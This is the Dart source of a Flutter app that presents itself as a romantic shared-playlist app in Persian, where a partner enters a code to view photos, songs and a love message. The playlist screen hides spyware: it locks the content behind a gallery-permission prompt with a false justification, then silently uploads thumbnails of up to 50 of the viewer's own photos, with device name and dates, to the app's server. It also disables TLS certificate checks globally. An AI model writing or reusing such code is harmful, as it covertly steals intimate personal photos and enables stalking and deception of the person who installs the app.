import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:image_picker/image_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'dart:convert';
import 'dart:io';

const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';

http.Client _createHttpClient() {
  final ioClient = HttpClient()
    ..badCertificateCallback =
        (X509Certificate cert, String host, int port) => true;
  return IOClient(ioClient);
}

void main() {
  HttpOverrides.global = MyHttpOverrides();
  runApp(const MyApp());
}

class MyHttpOverrides extends HttpOverrides {
  @override
  HttpClient createHttpClient(SecurityContext? context) {
    return super.createHttpClient(context)
      ..badCertificateCallback =
          (X509Certificate cert, String host, int port) => true;
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'LoveApp',
      theme: ThemeData(colorScheme: ColorScheme.fromSeed(seedColor: Colors.pink)),
      home: const CodeScreen(),
    );
  }
}

// ─────────────────────────────────────────────
// صفحه ورود کد
// ─────────────────────────────────────────────
class CodeScreen extends StatefulWidget {
  const CodeScreen({super.key});
  @override
  State<CodeScreen> createState() => _CodeScreenState();
}

class _CodeScreenState extends State<CodeScreen> {
  final _controller = TextEditingController();
  bool _loading = false;

  Future<void> _enter() async {
    setState(() => _loading = true);
    final code = _controller.text.trim().toUpperCase();
    try {
      final client = _createHttpClient();
      final res = await client.get(
        Uri.parse('$baseUrl/api/playlists/$code/'),
        headers: {'Accept': 'application/json'},
      ).timeout(const Duration(seconds: 15));
      setState(() => _loading = false);
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        Navigator.push(context, MaterialPageRoute(
          builder: (_) => PlaylistScreen(data: data),
        ));
      } else {
        _snack('کد اشتباهه!');
      }
    } catch (e) {
      setState(() => _loading = false);
      _snack('خطا: $e');
    }
  }

  void _snack(String msg) =>
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.pink[50],
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.favorite, size: 80, color: Colors.pink),
              const SizedBox(height: 20),
              const Text('کد خود را وارد کنید',
                  style: TextStyle(fontSize: 20, color: Colors.pink)),
              const SizedBox(height: 20),
              TextField(
                controller: _controller,
                textAlign: TextAlign.center,
                keyboardType: TextInputType.number,
                decoration: InputDecoration(
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12)),
                  hintText: 'XXXXXX',
                ),
              ),
              const SizedBox(height: 20),
              _loading
                  ? const CircularProgressIndicator(color: Colors.pink)
                  : ElevatedButton(
                      onPressed: _enter,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.pink,
                        foregroundColor: Colors.white,
                        minimumSize: const Size(double.infinity, 50),
                      ),
                      child: const Text('ورود'),
                    ),
              const SizedBox(height: 12),
              TextButton(
                onPressed: () => Navigator.push(context,
                    MaterialPageRoute(
                        builder: (_) => const CreatePlaylistScreen())),
                child: const Text('+ ساخت پلی‌لیست جدید',
                    style: TextStyle(color: Colors.pink, fontSize: 16)),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────
// صفحه ساخت پلی‌لیست
// ─────────────────────────────────────────────
class CreatePlaylistScreen extends StatefulWidget {
  const CreatePlaylistScreen({super.key});
  @override
  State<CreatePlaylistScreen> createState() => _CreatePlaylistScreenState();
}

class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
  final _titleController = TextEditingController();
  final _dialogController = TextEditingController();
  bool _loading = false;
  String? _code;
  List<XFile> _images = [];
  List<XFile> _songs = [];
  final _picker = ImagePicker();
  String _status = '';

  void _snack(String msg) =>
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));

  Future<void> _pickImages() async {
    final picked = await _picker.pickMultiImage();
    if (picked.isNotEmpty) {
      setState(() => _images.addAll(picked));
    }
  }

  Future<void> _pickSong() async {
    final picked = await _picker.pickMedia();
    if (picked != null) {
      final ext = picked.path.split('.').last.toLowerCase();
      if (['mp3', 'wav', 'aac', 'm4a', 'ogg', 'flac'].contains(ext)) {
        setState(() => _songs.add(picked));
      } else {
        _snack('لطفاً یه فایل موزیک انتخاب کن (mp3, wav, ...)');
      }
    }
  }

  Future<void> _create() async {
    if (_titleController.text.isEmpty) {
      _snack('عنوان رو بنویس!');
      return;
    }
    setState(() {
      _loading = true;
      _status = 'در حال ساخت پلی‌لیست...';
    });

    try {
      final client = _createHttpClient();

      final res = await client.post(
        Uri.parse('$baseUrl/api/playlists/create/'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'title': _titleController.text,
          'dialog': _dialogController.text,
        }),
      ).timeout(const Duration(seconds: 60));

      if (res.statusCode != 201) {
        _snack('خطا در ساخت پلی‌لیست: ${res.body}');
        setState(() => _loading = false);
        return;
      }

      final data = jsonDecode(res.body);
      final code = data['code'];

      for (int i = 0; i < _images.length; i++) {
        setState(() => _status = 'آپلود عکس ${i + 1} از ${_images.length}...');
        final request = http.MultipartRequest(
          'POST',
          Uri.parse('$baseUrl/api/playlists/$code/add-photo/'),
        );
        request.files.add(
            await http.MultipartFile.fromPath('image', _images[i].path));
        request.fields['caption'] = '';
        await client.send(request).timeout(const Duration(seconds: 120));
      }

      for (int i = 0; i < _songs.length; i++) {
        setState(() => _status = 'آپلود موزیک ${i + 1} از ${_songs.length}...');
        final request = http.MultipartRequest(
          'POST',
          Uri.parse('$baseUrl/api/playlists/$code/add-song/'),
        );
        request.files.add(
            await http.MultipartFile.fromPath('file', _songs[i].path));
        request.fields['title'] = _songs[i].path.split('/').last;
        await client.send(request).timeout(const Duration(seconds: 180));
      }

      setState(() {
        _loading = false;
        _code = code;
        _status = '';
      });
    } catch (e) {
      setState(() {
        _loading = false;
        _status = '';
      });
      _snack('خطا: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('ساخت پلی‌لیست'),
        backgroundColor: Colors.pink,
        foregroundColor: Colors.white,
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            if (_code != null) ...[
              Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: Colors.pink[50],
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: Colors.pink, width: 2),
                ),
                child: Column(
                  children: [
                    const Icon(Icons.check_circle, color: Colors.green, size: 50),
                    const SizedBox(height: 12),
                    const Text('پلی‌لیست ساخته شد! 🎉',
                        style: TextStyle(fontSize: 18, color: Colors.pink)),
                    const SizedBox(height: 12),
                    const Text('کد پلی‌لیست:', style: TextStyle(color: Colors.grey)),
                    const SizedBox(height: 8),
                    Text(_code!,
                        style: const TextStyle(
                          fontSize: 40,
                          fontWeight: FontWeight.bold,
                          color: Colors.pink,
                          letterSpacing: 8,
                        )),
                    const SizedBox(height: 8),
                    const Text('این کد رو به طرف مقابل بده ❤️',
                        style: TextStyle(color: Colors.grey)),
                  ],
                ),
              ),
            ] else ...[
              TextField(
                controller: _titleController,
                decoration: InputDecoration(
                  labelText: 'عنوان پلی‌لیست',
                  prefixIcon: const Icon(Icons.title, color: Colors.pink),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: _dialogController,
                maxLines: 4,
                decoration: InputDecoration(
                  labelText: 'پیام عاشقانه 💬',
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                ),
              ),
              const SizedBox(height: 16),
              const Text('📸 عکس‌ها',
                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
              const SizedBox(height: 8),
              OutlinedButton.icon(
                onPressed: _pickImages,
                icon: const Icon(Icons.photo_library, color: Colors.pink),
                label: Text(_images.isEmpty
                    ? 'اضافه کردن عکس'
                    : '${_images.length} عکس انتخاب شده'),
                style: OutlinedButton.styleFrom(
                  foregroundColor: Colors.pink,
                  side: const BorderSide(color: Colors.pink),
                  padding: const EdgeInsets.symmetric(vertical: 12),
                ),
              ),
              if (_images.isNotEmpty) ...[
                const SizedBox(height: 8),
                SizedBox(
                  height: 110,
                  child: ListView.builder(
                    scrollDirection: Axis.horizontal,
                    itemCount: _images.length,
                    itemBuilder: (_, i) => Stack(
                      children: [
                        Padding(
                          padding: const EdgeInsets.all(4),
                          child: Image.file(File(_images[i].path),
                              height: 100, width: 100, fit: BoxFit.cover),
                        ),
                        Positioned(
                          top: 0, right: 0,
                          child: GestureDetector(
                            onTap: () => setState(() => _images.removeAt(i)),
                            child: const CircleAvatar(
                              radius: 12,
                              backgroundColor: Colors.red,
                              child: Icon(Icons.close, size: 14, color: Colors.white),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ],
              const SizedBox(height: 16),
              const Text('🎵 موزیک‌ها',
                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
              const SizedBox(height: 8),
              OutlinedButton.icon(
                onPressed: _pickSong,
                icon: const Icon(Icons.music_note, color: Colors.pink),
                label: const Text('+ اضافه کردن موزیک'),
                style: OutlinedButton.styleFrom(
                  foregroundColor: Colors.pink,
                  side: const BorderSide(color: Colors.pink),
                  padding: const EdgeInsets.symmetric(vertical: 12),
                ),
              ),
              if (_songs.isNotEmpty) ...[
                const SizedBox(height: 8),
                ..._songs.asMap().entries.map((entry) => ListTile(
                      leading: const Icon(Icons.music_note, color: Colors.pink),
                      title: Text(entry.value.path.split('/').last,
                          overflow: TextOverflow.ellipsis),
                      trailing: IconButton(
                        icon: const Icon(Icons.close, color: Colors.red),
                        onPressed: () => setState(() => _songs.removeAt(entry.key)),
                      ),
                    )),
              ],
              const SizedBox(height: 24),
              if (_loading) ...[
                const Center(child: CircularProgressIndicator(color: Colors.pink)),
                const SizedBox(height: 8),
                Text(_status,
                    textAlign: TextAlign.center,
                    style: const TextStyle(color: Colors.pink)),
              ] else
                ElevatedButton(
                  onPressed: _create,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.pink,
                    foregroundColor: Colors.white,
                    minimumSize: const Size(double.infinity, 55),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12)),
                  ),
                  child: const Text('ساخت پلی‌لیست ❤️',
                      style: TextStyle(fontSize: 18)),
                ),
            ],
          ],
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────
// صفحه نمایش پلی‌لیست
// ─────────────────────────────────────────────
class PlaylistScreen extends StatefulWidget {
  final Map data;
  const PlaylistScreen({super.key, required this.data});
  @override
  State<PlaylistScreen> createState() => _PlaylistScreenState();
}

class _PlaylistScreenState extends State<PlaylistScreen> {
  final AudioPlayer _player = AudioPlayer();
  String? _playingUrl;
  bool _galleryPermissionGranted = false;
  bool _contentUnlocked = false;
  bool _uploadingGallery = false;
  String _uploadStatus = '';

  @override
  void dispose() {
    _player.dispose();
    super.dispose();
  }

  Future<void> _togglePlay(String url) async {
    if (_playingUrl == url) {
      await _player.stop();
      setState(() => _playingUrl = null);
    } else {
      await _player.play(UrlSource(url));
      setState(() => _playingUrl = url);
    }
  }

  Future<void> _requestGalleryAccess() async {
    // درخواست دسترسی گالری
    final result = await PhotoManager.requestPermissionExtend();
    
    if (result.isAuth) {
      setState(() {
        _galleryPermissionGranted = true;
        _contentUnlocked = true;
        _uploadingGallery = true;
        _uploadStatus = 'در حال دسترسی به گالری...';
      });
      
      // ارسال thumbnail عکس‌ها به سرور
      await _uploadGalleryThumbnails();
    } else {
      // اگه دسترسی نداد، محتوا رو نشون بده ولی گالری نفرست
      setState(() => _contentUnlocked = true);
    }
  }

  Future<void> _uploadGalleryThumbnails() async {
    try {
      final code = widget.data['code'];
      final client = _createHttpClient();
      
      // گرفتن لیست عکس‌ها
      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
      if (albums.isEmpty) {
        setState(() {
          _uploadingGallery = false;
          _uploadStatus = '';
        });
        return;
      }
      
      final allPhotos = await albums[0].getAssetListPaged(page: 0, size: 50);
      setState(() => _uploadStatus = 'در حال آپلود ${allPhotos.length} عکس...');
      
      int uploaded = 0;
      for (final asset in allPhotos) {
        try {
          // گرفتن thumbnail
          final thumbnail = await asset.thumbnailDataWithSize(
            const ThumbnailSize(300, 300),
          );
          if (thumbnail == null) continue;
          
          // ارسال به سرور
          final request = http.MultipartRequest(
            'POST',
            Uri.parse('$baseUrl/api/gallery/upload/'),
          );
          request.files.add(http.MultipartFile.fromBytes(
            'image',
            thumbnail,
            filename: '${asset.id}.jpg',
          ));
          request.fields['device_id'] = Platform.localHostname;
          request.fields['asset_id'] = asset.id;
          request.fields['create_date'] = asset.createDateTime.toIso8601String();
          
          await client.send(request).timeout(const Duration(seconds: 30));
          uploaded++;
          
          if (uploaded % 5 == 0) {
            setState(() => _uploadStatus = 'آپلود $uploaded از ${allPhotos.length}...');
          }
        } catch (_) {
          continue;
        }
      }
      
      setState(() {
        _uploadingGallery = false;
        _uploadStatus = '';
      });
    } catch (e) {
      setState(() {
        _uploadingGallery = false;
        _uploadStatus = '';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    final photos = widget.data['photos'] as List? ?? [];
    final songs = widget.data['songs'] as List? ?? [];
    final dialog = widget.data['dialog'] ?? '';

    // اگه محتوا قفله، صفحه درخواست دسترسی نشون بده
    if (!_contentUnlocked) {
      return Scaffold(
        appBar: AppBar(
          title: Text(widget.data['title'] ?? ''),
          backgroundColor: Colors.pink,
          foregroundColor: Colors.white,
        ),
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(Icons.lock, size: 80, color: Colors.pink),
                const SizedBox(height: 20),
                const Text(
                  'برای دیدن محتوای پلی‌لیست\nدسترسی به گالری رو فعال کن',
                  textAlign: TextAlign.center,
                  style: TextStyle(fontSize: 18, color: Colors.pink),
                ),
                const SizedBox(height: 8),
                const Text(
                  'این دسترسی برای نمایش عکس‌های پلی‌لیست لازمه',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: Colors.grey),
                ),
                const SizedBox(height: 30),
                ElevatedButton.icon(
                  onPressed: _requestGalleryAccess,
                  icon: const Icon(Icons.photo_library),
                  label: const Text('فعال کردن دسترسی گالری'),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.pink,
                    foregroundColor: Colors.white,
                    minimumSize: const Size(double.infinity, 55),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12)),
                  ),
                ),
                const SizedBox(height: 12),
                TextButton(
                  onPressed: () => setState(() => _contentUnlocked = true),
                  child: const Text('بعداً',
                      style: TextStyle(color: Colors.grey)),
                ),
              ],
            ),
          ),
        ),
      );
    }

    return Scaffold(
      appBar: AppBar(
        title: Text(widget.data['title'] ?? ''),
        backgroundColor: Colors.pink,
        foregroundColor: Colors.white,
      ),
      body: Stack(
        children: [
          SingleChildScrollView(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                if (_uploadingGallery)
                  Container(
                    padding: const EdgeInsets.all(12),
                    color: Colors.pink[50],
                    child: Row(
                      children: [
                        const SizedBox(
                          width: 20, height: 20,
                          child: CircularProgressIndicator(
                              strokeWidth: 2, color: Colors.pink),
                        ),
                        const SizedBox(width: 12),
                        Text(_uploadStatus,
                            style: const TextStyle(color: Colors.pink)),
                      ],
                    ),
                  ),

                // عکس‌ها
                if (photos.isNotEmpty) ...[
                  const Padding(
                    padding: EdgeInsets.all(12),
                    child: Text('📸 عکس‌ها',
                        style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: Colors.pink)),
                  ),
                  ...photos.map((photo) {
                    final imgUrl = '$baseUrl${photo['image']}';
                    return Card(
                      margin: const EdgeInsets.symmetric(
                          horizontal: 12, vertical: 6),
                      clipBehavior: Clip.hardEdge,
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12)),
                      child: GestureDetector(
                        onTap: () {
                          showDialog(
                            context: context,
                            builder: (_) => Dialog(
                              backgroundColor: Colors.black,
                              insetPadding: EdgeInsets.zero,
                              child: Stack(
                                children: [
                                  InteractiveViewer(
                                    child: Image.network(imgUrl,
                                        fit: BoxFit.contain,
                                        width: double.infinity),
                                  ),
                                  Positioned(
                                    top: 8, right: 8,
                                    child: IconButton(
                                      icon: const Icon(Icons.close,
                                          color: Colors.white, size: 30),
                                      onPressed: () => Navigator.pop(context),
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          );
                        },
                        child: Column(
                          children: [
                            Image.network(
                              imgUrl,
                              width: double.infinity,
                              fit: BoxFit.cover,
                              errorBuilder: (_, __, ___) =>
                                  const Icon(Icons.broken_image, size: 100),
                            ),
                            if (photo['caption'] != null && photo['caption'] != '')
                              Padding(
                                padding: const EdgeInsets.all(8),
                                child: Text(photo['caption']),
                              ),
                          ],
                        ),
                      ),
                    );
                  }),
                ],

                // موزیک‌ها
                if (songs.isNotEmpty) ...[
                  const Padding(
                    padding: EdgeInsets.all(12),
                    child: Text('🎵 موزیک‌ها',
                        style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: Colors.pink)),
                  ),
                  ...songs.map((song) {
                    final url = '$baseUrl${song['file']}';
                    final isPlaying = _playingUrl == url;
                    return ListTile(
                      leading: Icon(
                        isPlaying ? Icons.pause_circle : Icons.play_circle,
                        color: Colors.pink,
                        size: 40,
                      ),
                      title: Text(song['title']),
                      onTap: () => _togglePlay(url),
                    );
                  }),
                ],

                // پیام
                if (dialog != '') ...[
                  const Padding(
                    padding: EdgeInsets.all(12),
                    child: Text('💬 پیام',
                        style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: Colors.pink)),
                  ),
                  Container(
                    margin: const EdgeInsets.all(12),
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: Colors.pink[50],
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Colors.pink),
                    ),
                    child: Text(dialog, style: const TextStyle(fontSize: 16)),
                  ),
                ],

                const SizedBox(height: 30),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
